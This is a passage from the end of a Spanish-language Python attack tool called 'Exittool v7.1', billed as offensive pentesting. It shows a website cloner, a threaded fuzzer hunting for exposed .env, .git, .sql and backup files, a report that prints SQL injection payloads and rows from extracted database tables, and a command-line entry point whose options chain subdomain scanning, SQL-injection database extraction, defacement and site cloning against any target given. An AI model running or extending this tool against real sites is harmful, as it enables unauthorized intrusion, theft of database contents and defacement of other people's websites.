            os.makedirs(f"{self.out}/clone/{dominio}/css", exist_ok=True)
            os.makedirs(f"{self.out}/clone/{dominio}/js", exist_ok=True)
            os.makedirs(f"{self.out}/clone/{dominio}/img", exist_ok=True)
            os.makedirs(f"{self.out}/clone/{dominio}/assets", exist_ok=True)

            visitadas = set()
            cola = deque()
            cola.append((sitio, 0))
            contador = 0
            assets = set()

            while cola and contador < max_paginas:
                url, prof = cola.popleft()
                url = url.split('#')[0].rstrip('/')
                if url in visitadas:
                    continue

                # Validar URL
                try:
                    p = urlparse(url)
                    if p.scheme not in ('http', 'https'):
                        continue
                except Exception:
                    continue

                visitadas.add(url)

                r = self._get(url, timeout=5)
                if not r:
                    continue

                contador += 1
                print(f"    [{contador}] {url[:100]}")

                try:
                    soup = BeautifulSoup(r.text, 'html.parser')
                    parsed = urlparse(url)

                    # Descargar assets
                    for tag, attr, carpeta_def in [
                        ('link', 'href', 'css'),
                        ('script', 'src', 'js'),
                        ('img', 'src', 'img'),
                        ('source', 'src', 'img'),
                    ]:
                        for el in soup.find_all(tag):
                            src = el.get(attr)
                            if not src or src.startswith('data:') or src.startswith('#'):
                                continue
                            abs_url = urljoin(url, src)
                            if dominio not in abs_url:
                                continue
                            if abs_url in assets:
                                continue

                            try:
                                ra = self._s().get(abs_url, timeout=5, stream=True, verify=False)
                                if ra.status_code == 200:
                                    path = urlparse(abs_url).path.strip('/')
                                    if not path:
                                        continue
                                    nombre = path.replace('/', '_')
                                    ext = os.path.splitext(path)[1].lower()

                                    if ext in ['.css']:
                                        carpeta_dest = 'css'
                                    elif ext in ['.js', '.json']:
                                        carpeta_dest = 'js'
                                    elif ext in ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.webp']:
                                        carpeta_dest = 'img'
                                    else:
                                        carpeta_dest = 'assets'

                                    ruta_local = f"{self.out}/clone/{dominio}/{carpeta_dest}/{nombre}"
                                    os.makedirs(os.path.dirname(ruta_local), exist_ok=True)

                                    with open(ruta_local, 'wb') as f:
                                        for chunk in ra.iter_content(65536):
                                            f.write(chunk)

                                    assets.add(abs_url)
                                    el[attr] = f"../{carpeta_dest}/{nombre}"
                            except Exception:
                                pass

                    # Reemplazar urls() en CSS descargados
                    for css_file in glob.glob(f"{self.out}/clone/{dominio}/css/*.css"):
                        try:
                            with open(css_file, 'r', encoding='utf-8', errors='ignore') as f:
                                css_content = f.read()
                            css_content = re.sub(
                                r'url\([\'"]?(?!https?://|data:)[^\'")]+[\'"]?\)',
                                lambda m: f'url({m.group(0)})',
                                css_content
                            )
                            with open(css_file, 'w', encoding='utf-8') as f:
                                f.write(css_content)
                        except Exception:
                            pass

                    # Actualizar links
                    for a in soup.find_all('a', href=True):
                        href = a['href'].split('#')[0]
                        if not href or href.startswith(('javascript:', 'mailto:', 'tel:', 'data:')):
                            continue
                        abs_url = urljoin(url, href)
                        if dominio in abs_url:
                            rel_path = urlparse(abs_url).path.strip('/') or 'index'
                            a['href'] = f"pages/{rel_path.replace('/', '_')}"
                            norm = abs_url.rstrip('/')
                            if norm not in visitadas and prof + 1 <= 2:
                                cola.append((norm, prof + 1))

                    # Guardar página
                    nombre_pag = (parsed.path.strip('/') or 'index').replace('/', '_')
                    if not nombre_pag.endswith('.html'):
                        nombre_pag += '.html'
                    with open(f"{self.out}/clone/{dominio}/pages/{nombre_pag}", 'w', encoding='utf-8') as f:
                        f.write(str(soup))
                    self.paginas_clonadas.append(f"{self.out}/clone/{dominio}/pages/{nombre_pag}")

                except Exception:
                    continue

            # Índice del sitio
            self._generar_index(dominio)
            print(f"    [✅] {contador} páginas | {len(assets)} assets")

        total_size = sum(os.path.getsize(f) for f in self.paginas_clonadas if os.path.exists(f))
        print(f"\n  [✅] Total clonado: {len(self.paginas_clonadas)} páginas | {self._fmt(total_size)}")

    def _generar_index(self, dominio):
        """Genera un índice HTML de las páginas clonadas."""
        html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Clone: {dominio}</title>
<style>body{{font-family:monospace;background:#111;color:#0f0;padding:40px}}
a{{color:#0f0;display:block;padding:3px;text-decoration:none}}
a:hover{{background:#222}}
h1{{border-bottom:1px solid #0f0}}</style></head><body>
<h1>Clone: {dominio}</h1><hr>"""
        for f_item in sorted(glob.glob(f"{self.out}/clone/{dominio}/pages/*.html")):
            rel = os.path.relpath(f_item, f"{self.out}/clone/{dominio}")
            html += f'<a href="{rel}">{rel}</a>\n'
        html += "</body></html>"
        with open(f"{self.out}/clone/{dominio}/index.html", 'w') as f:
            f.write(html)

    # =====================================================================
    # 8. DIRECTORY FUZZING (corregido: paralelizado con threads)
    # =====================================================================

    def fuzz_dirs(self, url_base=None, max_files=400):
        """Directory fuzzing con paralelización."""
        if not hasattr(self, 'wordlist') or not self.wordlist:
            print("  [-] Requiere wordlist (-w)")
            return

        sitios = [url_base] if url_base else ([self.target] + self.subdominios_encontrados)
        sitios = sitios[:3]

        print(f"\n{'='*60}")
        print(f"  DIRECTORY FUZZING - {len(sitios)} sitios")
        print(f"{'='*60}")

        exts = ['', '.php', '.html', '.txt', '.bak', '.env', '.git', '.json',
                '.xml', '.sql', '.zip', '.old', '.conf', '.inc', '.log', '.tar.gz']

        for sitio in sitios:
            dominio = urlparse(sitio).netloc.split(':')[0]
            print(f"\n  [📁] {sitio}")
            encontrados = []
            max_f = min(len(self.wordlist), max_files)

            def _fuzz_entry(entry):
                """Fuzzea una entrada con todas las extensiones."""
                local_found = []
                for ext in exts:
                    path = (entry + ext).lstrip('/')
                    url = urljoin(sitio + '/', path)
                    try:
                        r = self._s().get(url, timeout=3, allow_redirects=False, verify=False)
                        if r.status_code == 200:
                            local_found.append((url, len(r.content), 'ok'))
                        elif r.status_code == 403:
                            local_found.append((url, 0, '403'))
                        elif r.status_code == 301 or r.status_code == 302:
                            local_found.append((url, 0, 'redirect'))
                    except Exception:
                        pass
                return local_found

            with ThreadPoolExecutor(max_workers=min(self.threads, 20)) as pool:
                futuros = {pool.submit(_fuzz_entry, entry): entry for entry in self.wordlist[:max_f]}
                for i, futuro in enumerate(as_completed(futuros)):
                    try:
                        resultados = futuro.result()
                        for result_url, size, estado in resultados:
                            if estado == 'ok':
                                encontrados.append(result_url)
                                print(f"\n    [✅] {result_url} [{size}b]")
                            elif estado == '403':
                                print(f"\n    [🚫] 403 {result_url}")
                            elif estado == 'redirect':
                                print(f"\n    [↪️] 30x {result_url}")
                    except Exception:
                        pass

                    if (i + 1) % 100 == 0:
                        self._progreso(i + 1, max_f, f"{len(encontrados)} encontrados en {dominio}")

            print(f"\n    [✅] {dominio}: {len(encontrados)} rutas")

    # =====================================================================
    # 9. REPORTE (corregido: manejo seguro de paths)
    # =====================================================================

    def reporte(self):
        print(f"\n{'='*60}")
        print(f"  REPORTE FINAL")
        print(f"{'='*60}")

        reales = [v for v in self.vulns if v['conf'] == 'alta']
        medios = [v for v in self.vulns if v['conf'] == 'media']

        print(f"\n  ESTADÍSTICAS GLOBALES:")
        print(f"  • Subdominios encontrados: {len(self.subdominios_encontrados)}")
        for s in self.subdominios_encontrados:
            print(f"      {s}")
        print(f"  • URLs descubiertas: {len(self.urls_descubiertas)}")
        print(f"  • URLs dinámicas: {len(self.urls_dinamicas)}")
        print(f"  • Vulnerabilidades CRÍTICAS: {len(reales)}")
        print(f"  • Vulnerabilidades medias: {len(medios)}")
        print(f"  • BD extraída: {len(self.tablas_extraidas)} tablas")
        # Contar sitios clonados de forma segura
        sitios_clonados = set()
        for u in self.paginas_clonadas:
            parts = u.split('/')
            if len(parts) >= 5:
                sitios_clonados.add(parts[4])
        print(f"  • Sitios clonados: {len(sitios_clonados)}")
        print(f"  • Deface: {'SÍ' if self.deface_ok else 'NO'}")

        if reales:
            print(f"\n  {'='*50}")
            print(f"  VULNERABILIDADES CRÍTICAS:")
            for i, v in enumerate(reales, 1):
                print(f"\n  [{i:02d}] {v['cat'].upper()} en {v['url'][:80]}")
                print(f"       Param: {v['param']} | {v['ind'][0]}")
                print(f"       Payload: {v['payload'][:70]}")

        if self.tablas_extraidas:
            print(f"\n  DATOS EXTRAÍDOS:")
            for t, d in self.tablas_extraidas.items():
                print(f"    • {t}: {len(d['filas'])} filas")

        # Guardar reporte completo
        try:
            ruta = f"{self.out}/reporte.txt"
            with open(ruta, 'w', encoding='utf-8') as f:
                f.write(f"EXITTOOL v7.1 - REPORTE DE PENETRACIÓN\n")
                f.write(f"{'='*60}\n")
                f.write(f"Objetivo: {self.target}\n")
                f.write(f"Fecha: {datetime.now()}\n")
                f.write(f"{'='*60}\n\n")

                f.write(f"SUBDOMINIOS: {len(self.subdominios_encontrados)}\n")
                for s in self.subdominios_encontrados:
                    f.write(f"  {s}\n")

                f.write(f"\nVULNERABILIDADES CRÍTICAS: {len(reales)}\n\n")
                for v in reales:
                    f.write(f"[{v['cat'].upper()}] {v['url']}?{v['param']}={v['payload']}\n")
                    f.write(f"  {v['ind'][0]}\n")
                    f.write(f"  {v['time']}\n\n")

                f.write(f"\nVULNERABILIDADES MEDIAS: {len(medios)}\n\n")
                for v in medios:
                    f.write(f"[{v['cat'].upper()}] {v['url']}?{v['param']}\n")
                    f.write(f"  {v['ind'][0]}\n\n")

                if self.tablas_extraidas:
                    f.write(f"\nBD EXTRAÍDA: {len(self.tablas_extraidas)} tablas\n")
                    for t, d in self.tablas_extraidas.items():
                        f.write(f"\nTabla: {t} ({len(d['filas'])} filas)\n")
                        f.write(f"Columnas: {', '.join(d['columnas'])}\n")
                        for fila in d['filas'][:5]:
                            f.write(f"  {fila}\n")

                f.write(f"\nDEFACE: {'EXITOSO' if self.deface_ok else 'FALLIDO'}\n")
                f.write(f"CLONACIÓN: {len(self.paginas_clonadas)} páginas\n")

            print(f"\n  [📁] Reporte guardado: {ruta}")
        except Exception as e:
            print(f"  [-] Error guardando reporte: {e}")


# =====================================================================
# MAIN
# =====================================================================

def main():
    parser = argparse.ArgumentParser(description='Exittool v7.1 - Pentest Ofensivo con ataque a subdominios')
    parser.add_argument('target', help='URL objetivo (ej: https://ejemplo.com o ejemplo.com)')
    parser.add_argument('-w', '--wordlist', help='Wordlist directory fuzzing')
    parser.add_argument('-s', '--subdominios', help='Wordlist subdominios (opcional)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Hilos')
    parser.add_argument('-d', '--delay', type=int, default=0, help='Delay (ms)')
    parser.add_argument('-i', '--intensity', choices=['baja', 'media', 'alta'], default='alta')
    parser.add_argument('--all', action='store_true', help='Ejecutar TODO (subs + crawl + fuzz + extract + deface + clone + dir)')
    parser.add_argument('--subs', action='store_true', help='Solo escanear subdominios')
    parser.add_argument('--fuzz', action='store_true', help='Crawlear + fuzzear todo')
    parser.add_argument('--crawl', action='store_true', help='Solo crawlear')
    parser.add_argument('--dir', action='store_true', help='Directory fuzzing')
    parser.add_argument('--clone', action='store_true', help='Clonar sitios')
    parser.add_argument('--extract', action='store_true', help='Extraer BD')
    parser.add_argument('--deface', action='store_true', help='Deface')
    parser.add_argument('--proxy', help='Proxy (http://ip:puerto)')
    parser.add_argument('--out', default='exittool_output', help='Directorio salida')

    args = parser.parse_args()

    print(r"""
╔══════════════════════════════════════════════════════╗
║   ███████╗██╗  ██╗██╗████████╗████████╗             ║
║   ██╔════╝██║  ██║██║╚══██╔══╝╚══██╔══╝             ║
║   █████╗  ███████║██║   ██║      ██║                ║
║   ██╔══╝  ██╔══██║██║   ██║      ██║                ║
║   ███████╗██║  ██║██║   ██║      ██║                ║
║   ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝                ║
║          v7.1 - PENTEST OFENSIVO                      ║
╚══════════════════════════════════════════════════════╝
""")

    tool = Exittool(
        target=args.target,
        wordlist=args.wordlist,
        subdominios_list=args.subdominios,
        threads=args.threads,
        delay=args.delay,
        proxy=args.proxy,
        out=args.out
    )

    os.makedirs(args.out, exist_ok=True)

    # Reconocimiento inicial
    if not tool.reconocer():
        print("[-] No se puede conectar al objetivo principal")
        # Aún así, podemos escanear subdominios

    if args.all:
        print(f"\n{'='*60}")
        print(f"  MODO COMPLETO - ATACANDO TODO")
        print(f"{'='*60}")

        # 1. Subdominios
        subs = tool.escanear_subdominios()

        # 2. Crawlear dominio principal + subdominios
        print(f"\n  [🕷️] Crawleando dominio principal...")
        tool.crawlear(tool.target)

        for sub in subs[:5]:
            print(f"\n  [🕷️] Crawleando subdominio: {sub}")
            tool.crawlear(sub)

        # 3. Fuzzear todos
        tool.fuzzear(tool.target)
        for sub in subs[:5]:
            tool.fuzzear(sub)

        # 4. Extraer BD
        if tool.params_sqli:
            tool.extraer_bd()
        else:
            print("\n  [ℹ️] No hay SQLi para extraer BD")

        # 5. Deface
        tool.defacear()

        # 6. Directory fuzzing
        if args.wordlist:
            tool.fuzz_dirs()

        # 7. Clonar todo
        tool.clonar()

        # 8. Reporte
        tool.reporte()

    elif args.subs:
        tool.escanear_subdominios()
        tool.reporte()
    elif args.fuzz:
        tool.crawlear()
        tool.fuzzear()
        tool.escanear_subdominios()
        for sub in tool.subdominios_encontrados[:5]:
            tool.crawlear(sub)
            tool.fuzzear(sub)
        tool.reporte()
    elif args.crawl:
        tool.crawlear()
        tool.escanear_subdominios()
        for sub in tool.subdominios_encontrados[:5]:
            tool.crawlear(sub)
    elif args.dir:
        tool.fuzz_dirs()
    elif args.clone:
        tool.escanear_subdominios()
        tool.clonar()
    elif args.extract:
        if not tool.params_sqli:
            tool.crawlear()
            tool.fuzzear()
        tool.extraer_bd()
    elif args.deface:
        tool.defacear()
    else:
        tool.fuzzear()
        tool.reporte()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por usuario")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
